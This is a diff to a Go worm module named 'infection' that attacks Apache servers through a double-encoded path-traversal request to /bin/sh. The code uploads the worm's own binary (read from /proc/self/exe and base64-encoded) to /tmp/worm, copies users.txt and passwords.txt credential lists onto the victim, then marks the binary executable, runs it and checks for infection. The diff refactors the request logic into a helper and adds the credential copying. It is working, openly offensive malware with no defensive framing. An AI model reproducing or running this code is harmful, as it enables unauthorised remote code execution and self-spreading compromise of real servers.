@@ -2,7 +2,6 @@ package infection
 
 import (
 	"io/ioutil"
-	"log"
 	"fmt"
 	"net"
 	"encoding/base64"
@@ -13,7 +12,7 @@ import (
 
 var (
 	path = "/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"
-	copyCommandsTemplate = "echo;echo '%s' | base64 -d > %s;chmod u+x %s;"
+	copyCommandsTemplate = "echo;echo '%s' | base64 -d > %s"
 	commandsTemplate = "echo;%s"
 	wormPath = "/tmp/worm"
 )
@@ -29,40 +28,42 @@ func PrepareRequest(ip string, commands string) string {
 	return rt
 }
 
-func ApacheCheckInfection(ip string, port string) bool {
-	executeCommands := fmt.Sprintf("ls -l %s", wormPath)
-	commands := fmt.Sprintf(commandsTemplate,executeCommands)
+func MakeRequest(ip string, port string, commands string) string {
 	conn, err := net.Dial("tcp", ip+":"+port)
 	rt := PrepareRequest(ip, commands)
 	_, err = conn.Write([]byte(rt))
 	resp, err := ioutil.ReadAll(conn)
     if err != nil {
-        log.Fatal(err)
-		return false
+		return ""
     }
     conn.Close()
-	return strings.Contains(string(resp),wormPath)
+	return string(resp)
+}
+
+func ApacheCheckInfection(ip string, port string) bool {
+	executeCommands := fmt.Sprintf("ls -l %s", wormPath)
+	commands := fmt.Sprintf(commandsTemplate,executeCommands)
+	resp := MakeRequest(ip,port,commands)
+	return strings.Contains(resp,wormPath)
 }
 
 func ApacheInfect(ip string, port string) bool {
 	var worm []byte
 	worm = GetFile("/proc/self/exe")
 	worm64 := base64.StdEncoding.EncodeToString(worm)
-	commands := fmt.Sprintf(copyCommandsTemplate,worm64,wormPath,wormPath)
-	conn, err := net.Dial("tcp", ip+":"+port)
-	rt := PrepareRequest(ip, commands)
-	_, err = conn.Write([]byte(rt))
-    if err != nil {
-        log.Fatal(err)
-		return false
-    }
-
-    resp, err := ioutil.ReadAll(conn)
-    if err != nil {
-        log.Fatal(err)
-		return false
-    }
-	fmt.Println(string(resp))
-    conn.Close()
+	commands := fmt.Sprintf(copyCommandsTemplate,worm64,wormPath)
+	MakeRequest(ip,port,commands)
+	file := GetFile("./users.txt")
+	file64 := base64.StdEncoding.EncodeToString(file)
+	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/users.txt")
+	MakeRequest(ip,port,commands)
+	file = GetFile("./passwords.txt")
+	file64 = base64.StdEncoding.EncodeToString(file)
+	commands = fmt.Sprintf(copyCommandsTemplate,file64,"/tmp/passwords.txt")
+	MakeRequest(ip,port,commands)
+	commands = fmt.Sprintf("chmod u+x %s && %s", wormPath, wormPath)
+	commands = fmt.Sprintf(commandsTemplate,commands)
+	resp := MakeRequest(ip,port,commands)
+	fmt.Println(resp)
 	return ApacheCheckInfection(ip,port)
 }
